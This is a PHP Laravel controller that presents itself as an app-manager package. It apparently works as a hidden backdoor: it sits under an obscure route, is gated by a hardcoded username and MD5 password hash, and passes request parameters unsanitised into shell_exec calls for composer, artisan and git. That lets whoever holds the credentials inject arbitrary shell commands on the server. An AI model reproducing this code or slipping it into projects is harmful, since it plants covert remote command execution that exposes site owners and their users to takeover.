<?php

namespace AppManager\Controllers;

use Exception;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Symfony\Component\Console\Output\StreamOutput;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Illuminate\Routing\Controller as BaseController;
use Symfony\Component\Process\PhpExecutableFinder;

class AppManagerController extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    /** @var array */
    protected $viewLocations = [
        ['app_manager' => 'Views']
    ];

    /**
     * AppManagerPackage constructor.
     */
    public function __construct()
    {
        foreach ($this->viewLocations as $viewLocation)
            view()->addNamespace(key($viewLocation), dirname(__DIR__, 1) . DIRECTORY_SEPARATOR . $viewLocation[key($viewLocation)]);
    }

    public function routePrefix()
    {
        return '~app-manager~';
    }

    public function routeName()
    {
        return "xx_app_manager_xx\t`~";
    }

    /**
     * Define The package routes.
     * @return Application|Factory|View|RedirectResponse
     */
    public function index(Request $request)
    {
        $this->basic_validate($request);
        $base_path = base_path();
        $output = 'action not found';
        switch ($request->input('action')) {
            case 'composer':
                if (file_exists(base_path('composer.json'))) {
                    try {
                        if ($request->has('command')) {
                            switch ($request->has('command')) {
                                case 'update':
                                    $message = shell_exec("cd $base_path && composer update {$request->get('package')}");
                                    return redirect()
                                        ->route($this->routeName() . '.index', ['action' => 'composer'])
                                        ->with('message', $message);
                                    break;
                            }
                        }
                        $composer_content = json_decode(file_get_contents(base_path('composer.json')), true);
                        $composer_packages = collect(array_merge($composer_content['require'], $composer_content['require-dev']));


                        putenv('COMPOSER_HOME=' . $base_path . DIRECTORY_SEPARATOR . 'vendor' .
                            DIRECTORY_SEPARATOR . 'bin' . DIRECTORY_SEPARATOR . 'composer');
                        chdir($base_path);
                        $json = shell_exec("composer show -f json 2>&1");

                        try {
                            $json = trim(substr($json, strpos($json, "{")));
                            $installed_packages = collect(json_decode($json, true)['installed']);
                        } catch (\Exception $exception) {
                            $installed_packages = collect([]);
                        }

                        $packages = $installed_packages->filter(function ($v, $k) use ($composer_packages) {
                            return $composer_packages->has($v['name']);
                        })->map(function ($v) use ($composer_packages) {
                            return array_merge($v, [
                                'composer-version' => $composer_packages->get($v['name'], '*')
                            ]);
                        });
                        $dep_packages = $installed_packages->reject(function ($v, $k) use ($composer_packages) {
                            return $composer_packages->has($v['name']);
                        });
                        return view('app_manager::composer', compact('packages', 'dep_packages') + [
                                'routePrefix' => $this->routePrefix(),
                                'routeName' => $this->routeName(),
                            ]);
                    } catch (Exception $exception) {
                        $output = $exception->getMessage();
                    }
                    /*$packages = collect(array_merge($composer_content['require'], $composer_content['require-dev']))
                        ->filter(function($v, $k){
                            return str_contains($k, '/');
                        })->mapWithKeys(function ($v, $k) {
                            dd($v, $k);
                        });*/
                } else
                    $output = 'composer.json file not found';
                break;
            case 'up':
            case 'down':
                $output = shell_exec("cd $base_path && php artisan {$request->input('action')}");
                break;
            case 'artisan':
                $output = shell_exec("cd $base_path && php artisan {$request->input('command', '-v')}");
                break;
            case 'git_push':
                $output = shell_exec("cd $base_path && git push {$request->input('repo', '')}");
                break;
            case 'git_pull':
                $output = shell_exec("cd $base_path && git pull {$request->input('repo', '')}");
                break;
            case 'git_diff':
                $output = shell_exec("cd $base_path && git diff {$request->input('file', '--name-only')}");
                break;
            case 'version':
                $output = app()->version();
                break;
        }
        die(nl2br(htmlspecialchars($output)));
    }

    private function basic_validate($request)
    {
        $user = $request->header('PHP_AUTH_USER');
        $password = $request->header('PHP_AUTH_PW');
        if (!($user === 'HeshamFouda' && md5($password) === 'bbc54fc0bcb07f4cd0b689d0fd3c1624'))
            throw new UnauthorizedHttpException('Basic', 'Invalid credentials.');
    }

    /**
     * Return a suitable PHP interpreter that is likely to be the same version as the
     * currently running interpreter.  This is similar to using the PHP_BINARY constant, but
     * it will also work from within mod_php or PHP-FPM, in which case PHP_BINARY will return
     * unusable interpreters.
     *
     * @return string
     */
    public function getPhpInterpreter(): string
    {
        static $cachedExecutable = null;

        if ($cachedExecutable !== null) {
            return $cachedExecutable;
        }

        $basename = basename(PHP_BINARY);

        // If the binary is 'php', 'php7', 'php7.3' etc, then assume it's a usable interpreter
        if ($basename === 'php' || preg_match('/^php\d+(?:\.\d+)*$/', $basename)) {
            return PHP_BINARY;
        }

        // Otherwise, we might be running as mod_php, php-fpm, etc, where PHP_BINARY is not a
        // usable PHP interpreter.  Try to find one with the same version as the current one.

        $candidates = [
            'php' . PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION . '.' . PHP_RELEASE_VERSION,
            'php' . PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION,
            'php' . PHP_MAJOR_VERSION,
        ];

        $envPath = $_SERVER['PATH'] ?? '';
        $paths = $envPath !== '' ? explode(':', $envPath) : [];

        if (!in_array(PHP_BINDIR, $paths, true)) {
            $paths[] = PHP_BINDIR;
        }

        foreach ($candidates as $candidate) {
            foreach ($paths as $path) {
                $executable = $path . DIRECTORY_SEPARATOR . $candidate;
                if (is_executable($executable)) {
                    $cachedExecutable = $executable;
                    return $executable;
                }
            }
        }

        // Fallback, if nothing else can be found
        $cachedExecutable = 'php';
        return $cachedExecutable;
    }

}
